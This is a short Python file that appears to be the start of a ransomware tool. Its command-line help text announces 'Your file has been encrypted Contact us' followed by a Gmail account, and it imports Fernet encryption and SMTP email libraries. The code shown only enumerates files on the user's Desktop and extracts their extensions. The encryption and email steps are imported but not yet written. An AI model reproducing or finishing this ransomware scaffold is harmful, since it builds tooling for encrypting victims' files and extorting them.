import argparse
from ast import pattern
import getpass
import os
import pathlib
import smtplib
import platform
import re
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv
from pyrsistent import v



parser = argparse.ArgumentParser(description=f'Your file has been encrypted Contact us {os.environ.get("gmail_account")} for futher details"')
parser.add_argument('-k', '--key' , type=str, metavar='', help='add cryptographic key to decrypt the document')
parser.add_argument('-b','--backup', help='add crypthographyc key to decrypt the document', action='store_true')
parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
args = parser.parse_args()


#get target location 

def get_target_location(d_name):
    f_location = pathlib.Path.home() / d_name
    os.chdir(f_location)
    return f_location

#directory enumration
def enum_directuriy_files(directory):   

    list_files = []

    t_location_folder = get_target_location(directory)

    folder_items = os.listdir(t_location_folder)
    
    [list_files.append(var)  for var in folder_items if "." in var]

    return list_files

#leave the .*
def trim_list_files(list):

    trimed_list =  []
    for var in list:
        var = re.sub(r'^.*?\.', '.', var)
        trimed_list.append(var)
    
    return(trimed_list)


def test_success():
    print (enum_directuriy_files('Desktop'))


test_success()
trim_list_files(enum_directuriy_files('Desktop'))